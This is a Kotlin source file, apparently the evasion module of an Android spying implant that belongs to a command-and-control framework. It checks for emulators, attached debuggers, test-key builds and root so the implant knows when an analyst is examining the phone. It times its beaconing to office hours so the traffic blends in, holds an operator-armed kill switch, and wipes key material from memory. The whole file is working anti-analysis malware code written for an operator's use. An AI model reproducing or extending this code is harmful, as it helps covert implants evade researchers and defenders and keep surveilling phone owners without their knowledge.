package io.umbra.beacon

import android.os.Build
import android.os.Debug
import android.os.SystemClock
import java.io.File
import java.util.Calendar

/**
 * The posture of the phone.
 *
 * A phone that runs in an emulator, under a debugger or inside an
 * instrumented build is a phone that somebody is looking at, and the
 * implant has to know it.  The engine answers the same four questions the
 * desktop beacon answers (see `implant/rust/src/evade.rs`), with the
 * signals a phone actually has:
 *
 *   * is this an emulator?
 *   * is a debugger attached?
 *   * is the build instrumented (the test keys, the debugging build)?
 *   * is the phone rooted?
 *
 * The answers are not verdicts.  The operator decides what they mean: the
 * defaults slow the beacon down on a suspicious phone and never silence
 * it.
 *
 * The module also owns the schedule of the day and the kill switch, so the
 * phone behaves like the desktop implant: busy while the office is open,
 * quiet at night, and gone the moment the operator says so.
 */
object Evasion {
    /** One artefact on the phone. */
    data class Artefact(
        val name: String,
        val kind: String,
        val severity: Int,
        val detail: String,
    )

    /** What the engine thinks the phone is. */
    data class Posture(
        val emulated: Boolean = false,
        val instrumented: Boolean = false,
        val debugger: Boolean = false,
        val rooted: Boolean = false,
        val confidence: Int = 0,
        val reasons: List<String> = emptyList(),
        val artefacts: List<Artefact> = emptyList(),
    ) {
        /** The one-line name of the posture. */
        fun label(): String {
            val parts = mutableListOf<String>()
            if (debugger) parts.add("debugger attached")
            if (instrumented) parts.add("instrumented")
            if (emulated) parts.add("emulator")
            if (rooted) parts.add("rooted")
            if (parts.isEmpty()) parts.add("phone")
            return parts.joinToString(" ")
        }

        /** The posture as a report for the operator. */
        fun report(): String {
            val out = StringBuilder()
            out.append("posture: ${label()}\n")
            out.append("posture: confidence $confidence%\n")
            for (artefact in artefacts) {
                out.append(
                    "posture: artefact ${artefact.name} [${artefact.kind}] " +
                        "severity ${artefact.severity}: ${artefact.detail}\n",
                )
            }
            for (reason in reasons) {
                out.append("posture: because $reason\n")
            }
            return out.toString()
        }
    }

    /** The file the state is kept in. */
    private const val STATE_FILE = "evade.state"

    /** The state of the engine. */
    data class State(
        val silenceOnEmulator: Boolean = false,
        val slowOnEmulator: Boolean = true,
        val base: Long = 60,
        val busyStart: Int = 8,
        val busyEnd: Int = 18,
        val busyFactor: Long = 60,
        val nightFactor: Long = 180,
        val weekendFactor: Long = 150,
        val killArmed: Boolean = false,
        val killFile: String = "",
        val killUptimeHours: Long = 0,
        val killMarker: String = "",
        val killNote: String = "",
    )

    // -----------------------------------------------------------------------
    // The posture
    // -----------------------------------------------------------------------

    /** Look at the phone and say what it is. */
    fun classify(): Posture {
        var confidence = 0
        val reasons = mutableListOf<String>()
        val artefacts = mutableListOf<Artefact>()

        val emulator = emulatorSignals()
        if (emulator.isNotEmpty()) {
            confidence += 25
            reasons.addAll(emulator)
            artefacts.add(
                Artefact(
                    "emulator",
                    "virtualisation",
                    40,
                    emulator.first(),
                ),
            )
        }

        var debugger = false
        if (Debug.isDebuggerConnected() || Debug.waitingForDebugger()) {
            debugger = true
            confidence += 30
            reasons.add("a debugger is attached to the process")
            artefacts.add(
                Artefact(
                    "debugger",
                    "analyst-tool",
                    90,
                    "the runtime says a debugger is connected",
                ),
            )
        }

        var instrumented = false
        val tags = Build.TAGS ?: ""
        if (tags.contains("test-keys") || tags.contains("debug")) {
            instrumented = true
            confidence += 20
            reasons.add("the build is signed with the test keys")
            artefacts.add(
                Artefact(
                    "test-keys",
                    "instrumentation",
                    60,
                    "the build tags say $tags",
                ),
            )
        }

        var rooted = false
        val root = rootSignals()
        if (root.isNotEmpty()) {
            rooted = true
            confidence += 10
            reasons.addAll(root)
            artefacts.add(
                Artefact(
                    "root",
                    "instrumentation",
                    30,
                    root.first(),
                ),
            )
        }

        return Posture(
            emulated = emulator.isNotEmpty(),
            instrumented = instrumented,
            debugger = debugger,
            rooted = rooted,
            confidence = confidence.coerceAtMost(100),
            reasons = reasons.toList(),
            artefacts = artefacts.toList(),
        )
    }

    /** The signals that say "this is an emulator". */
    private fun emulatorSignals(): List<String> {
        val out = mutableListOf<String>()
        val fingerprint = Build.FINGERPRINT ?: ""
        if (fingerprint.contains("generic") ||
            fingerprint.contains("vbox") ||
            fingerprint.contains("emulator")
        ) {
            out.add("the build fingerprint says ${fingerprint.take(40)}")
        }
        val model = (Build.MODEL ?: "").lowercase()
        if (model.contains("sdk") ||
            model.contains("emulator") ||
            model.contains("simulator") ||
            model.contains("android sdk")
        ) {
            out.add("the model says $model")
        }
        val product = (Build.PRODUCT ?: "").lowercase()
        if (product.contains("sdk") ||
            product.contains("emulator") ||
            product.contains("simulator")
        ) {
            out.add("the product says $product")
        }
        val hardware = (Build.HARDWARE ?: "").lowercase()
        if (hardware == "goldfish" || hardware == "ranchu") {
            out.add("the hardware says $hardware")
        }
        if ((Build.BRAND ?: "").lowercase() == "generic" &&
            (Build.DEVICE ?: "").lowercase() == "generic"
        ) {
            out.add("the brand and the device are both generic")
        }
        for (path in listOf(
            "/dev/qemu_pipe",
            "/dev/socket/qemud",
            "/sys/qemu_trace",
            "/system/lib/libc_malloc_debug_qemu.so",
            "/dev/socket/genyd",
        )) {
            if (File(path).exists()) {
                out.add("the file $path exists")
            }
        }
        return out
    }

    /** The signals that say "the phone is rooted". */
    private fun rootSignals(): List<String> {
        val out = mutableListOf<String>()
        for (path in listOf(
            "/system/app/Superuser.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su",
            "/data/local/xbin/su",
            "/data/local/su",
            "/su/bin/su",
        )) {
            if (File(path).exists()) {
                out.add("the file $path exists")
            }
        }
        return out
    }

    // -----------------------------------------------------------------------
    // The state
    // -----------------------------------------------------------------------

    /** Read the state of the engine. */
    fun load(stateDir: String): State {
        if (stateDir.isEmpty()) return State()
        val file = File(stateDir, STATE_FILE)
        if (!file.exists()) return State()
        return try {
            val map = Upk.decode(file.readBytes()) as? Upk.MapV ?: return State()
            State(
                silenceOnEmulator = map.entries["silence_on_emulator"]?.flag() ?: false,
                slowOnEmulator = map.entries["slow_on_emulator"]?.flag() ?: true,
                base = map.entries["base"]?.long() ?: 60,
                busyStart = (map.entries["busy_start"]?.long() ?: 8L).toInt(),
                busyEnd = (map.entries["busy_end"]?.long() ?: 18L).toInt(),
                busyFactor = map.entries["busy_factor"]?.long() ?: 60,
                nightFactor = map.entries["night_factor"]?.long() ?: 180,
                weekendFactor = map.entries["weekend_factor"]?.long() ?: 150,
                killArmed = map.entries["kill_armed"]?.flag() ?: false,
                killFile = map.entries["kill_file"]?.text() ?: "",
                killUptimeHours = map.entries["kill_uptime_hours"]?.long() ?: 0,
                killMarker = map.entries["kill_marker"]?.text() ?: "",
                killNote = map.entries["kill_note"]?.text() ?: "",
            )
        } catch (e: Exception) {
            // A state file that cannot be read is not a reason to stop: the
            // defaults are safe.
            State()
        }
    }

    /** Write the state of the engine back. */
    fun save(stateDir: String, state: State) {
        if (stateDir.isEmpty()) return
        try {
            val file = File(stateDir, STATE_FILE)
            file.parentFile?.mkdirs()
            val value = Upk.map(
                "silence_on_emulator" to Upk.bool(state.silenceOnEmulator),
                "slow_on_emulator" to Upk.bool(state.slowOnEmulator),
                "base" to Upk.num(state.base),
                "busy_start" to Upk.num(state.busyStart.toLong()),
                "busy_end" to Upk.num(state.busyEnd.toLong()),
                "busy_factor" to Upk.num(state.busyFactor),
                "night_factor" to Upk.num(state.nightFactor),
                "weekend_factor" to Upk.num(state.weekendFactor),
                "kill_armed" to Upk.bool(state.killArmed),
                "kill_file" to Upk.str(state.killFile),
                "kill_uptime_hours" to Upk.num(state.killUptimeHours),
                "kill_marker" to Upk.str(state.killMarker),
                "kill_note" to Upk.str(state.killNote),
            )
            val tmp = File(file.parentFile, "$STATE_FILE.tmp")
            tmp.writeBytes(Upk.encode(value))
            tmp.renameTo(file)
        } catch (e: Exception) {
            // The state is a convenience, not a requirement.
        }
    }

    // -----------------------------------------------------------------------
    // The schedule
    // -----------------------------------------------------------------------

    /**
     * The factor the base interval is multiplied with at this moment.
     *
     * The phone is busy while the office is open and quiet at night, and
     * lazier at the weekend.
     */
    fun factor(state: State): Double {
        val calendar = Calendar.getInstance()
        val hour = calendar.get(Calendar.HOUR_OF_DAY)
        val day = calendar.get(Calendar.DAY_OF_WEEK)
        val weekend = day == Calendar.SATURDAY || day == Calendar.SUNDAY
        val busy = if (state.busyStart <= state.busyEnd) {
            hour >= state.busyStart && hour < state.busyEnd
        } else {
            hour >= state.busyStart || hour < state.busyEnd
        }
        var factor = if (busy) state.busyFactor else state.nightFactor
        if (weekend) factor = factor * state.weekendFactor / 100
        return factor / 100.0
    }

    // -----------------------------------------------------------------------
    // The kill switch
    // -----------------------------------------------------------------------

    /** The reason the kill switch fired, if it did. */
    fun killSwitch(state: State): String? {
        if (!state.killArmed) return null
        if (state.killFile.isNotEmpty() && File(state.killFile).exists()) {
            return "the file ${state.killFile} appeared"
        }
        if (state.killUptimeHours > 0 && uptimeHours() >= state.killUptimeHours) {
            return "the phone has been up for ${state.killUptimeHours} hours"
        }
        return null
    }

    /** Does the task carry the marker the operator armed? */
    fun markerFired(state: State, args: Upk): Boolean {
        if (!state.killArmed || state.killMarker.isEmpty()) return false
        return contains(args, state.killMarker)
    }

    /** Does the value hold the text anywhere? */
    private fun contains(value: Upk, text: String): Boolean = when (value) {
        is Upk.Str -> value.value.contains(text)
        is Upk.Arr -> value.items.any { contains(it, text) }
        is Upk.MapV -> value.entries.values.any { contains(it, text) }
        else -> false
    }

    /** How long the phone has been up, in hours. */
    fun uptimeHours(): Double = SystemClock.elapsedRealtime() / 3_600_000.0

    // -----------------------------------------------------------------------
    // The memory hygiene
    // -----------------------------------------------------------------------

    /**
     * The sensitive material the implant holds, and what happens to it.
     *
     * The description is the same one the desktop beacon gives: the keys
     * live in guards, and a buffer that is not needed any more is wiped
     * and not dropped.
     */
    fun memoryReport(): String =
        "memory: the key material lives in guards that wipe themselves\n" +
            "memory: the pre-shared key and the session keys\n" +
            "memory: the output of a task is wiped after it was sent\n"

    /** Wipe a buffer that held something sensitive. */
    fun wipe(buffer: ByteArray): Int {
        val size = buffer.size
        java.util.Arrays.fill(buffer, 0)
        return size
    }
}
